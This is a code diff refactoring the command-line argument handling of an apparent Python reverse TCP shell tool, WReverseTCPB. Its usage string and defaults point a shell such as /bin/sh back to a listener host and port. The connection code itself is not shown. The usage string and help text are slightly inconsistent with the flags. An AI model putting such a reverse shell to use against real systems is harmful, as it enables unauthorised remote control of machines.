@@ -16,45 +16,66 @@ class WReverseTCPB:
   VERSION = "1.0"
 
   USAGE = "Usage: python wrtcpb.py -lh 10.10.14.16 -lp 4444 -c /bin/sh"
-  FLAGS = ["-lh", "--local-host", "-lp", "--local-port", "-s", "--shell", "-v", "--version", "-h", "--help"]
+
+  class Flags:
+    LH = "-lh"
+    LOCAL_HOST = "--local-host"
+    LP = "-lp"
+    LOCAL_PORT = "--local-port"
+    S = "-s"
+    SHELL = "--shell"
+    V = "-v"
+    VERSION = "--version"
+    H = "-h"
+    HELP = "--help"
 
   def __init__(self, localHost="10.10.14.16", localPort=4444, shell="/bin/sh"):
     self.localHost = localHost  #type: str
     self.localPort = localPort  #type: int
     self.shell = shell  #type: str
 
+  def displayHelp(self):
+    FLAGS = WReverseTCPB.Flags
+    LH_HELP = "Specify your local ip address. Default is: {}".format(self.localHost)
+    LP_HELP = "Specify your local port. Default is: {}".format(self.localPort)
+    S_HELP = "Specify the shell to launch on successful reverse tcp. Default is: {}".format(self.shell)
+    V_HELP = "Show version"
+    H_HELP = "Show this help message"
+
+    print(WReverseTCPB.USAGE)
+    print("Optional arguments:")
+    print("  {}   {}     : {}".format(FLAGS.H, FLAGS.LOCAL_HOST, LH_HELP))
+    print("  {}, {}     : {}".format(FLAGS.LP, FLAGS.LOCAL_PORT, LP_HELP))
+    print("  {},  {}          : {}.".format(FLAGS.S, FLAGS.SHELL, S_HELP))
+    print("  {},  {}        : {}.".format(FLAGS.V, FLAGS.VERSION, V_HELP))
+    print("  {},  {}           : {}.".format(FLAGS.H, FLAGS.HELP, H_HELP))
+    exit()
+
   def checkArgs(self):  #type: (WReverseTCPB) -> None
-    FLAGS = WReverseTCPB.FLAGS
+    FLAGS = WReverseTCPB.Flags
     sysArgs = sys.argv
     if (len(sysArgs) == 1):
       return
 
-    if (sysArgs[1] == FLAGS[8] or sysArgs[1] == FLAGS[9]):
-      print(WReverseTCPB.USAGE)
-      print("Optional arguments:")
-      print("  -lh  --local-host     : Specify your local ip address")
-      print("  -lp, --local-port     : Specify your local port")
-      print("  -s,  --shell          : Specify the command to execute on successful reverse tcp.")
-      print("  -v,  --version        : Show version.")
-      print("  -h,  --help           : Show this help message")
-      exit()
+    if (sysArgs[1] == FLAGS.H or sysArgs[1] == FLAGS.HELP):
+      self.displayHelp()
 
-    if (sysArgs[1] == FLAGS[6] or sysArgs[1] == FLAGS[7]):
+    if (sysArgs[1] == FLAGS.V or sysArgs[1] == FLAGS.VERSION):
       print("Reverse TCP version: {}".format(WReverseTCPB.VERSION))
       exit()
 
-  def setArguments(self, flag, arg):  #type: (WReverseTCPB, str, str) -> None
-    FLAGS = WReverseTCPB.FLAGS
+  def setArguments(self, flag, value):  #type: (WReverseTCPB, str, str) -> None
+    FLAGS = WReverseTCPB.Flags
 
-    if (flag not in FLAGS):
+    if (flag not in FLAGS.__dict__.values()):
       raise ValueError("Unknown flag " + flag)
 
-    if (flag == FLAGS[0] or flag == FLAGS[1]):
-      self.localHost = arg
-    elif (flag == FLAGS[2] or flag == FLAGS[3]):
-      self.localPort = int(arg)
-    elif (flag == FLAGS[4] or flag == FLAGS[5]):
-      self.shell = arg
+    if (flag == FLAGS.LH or flag == FLAGS.LOCAL_HOST):
+      self.localHost = value
+    elif (flag == FLAGS.LP or flag == FLAGS.LOCAL_PORT):
+      self.localPort = int(value)
+    elif (flag == FLAGS.S or flag == FLAGS.SHELL):
+      self.shell = value
 
   def iterateArguments(self):  #type: (WReverseTCPB) -> None
     sysArgs = sys.argv
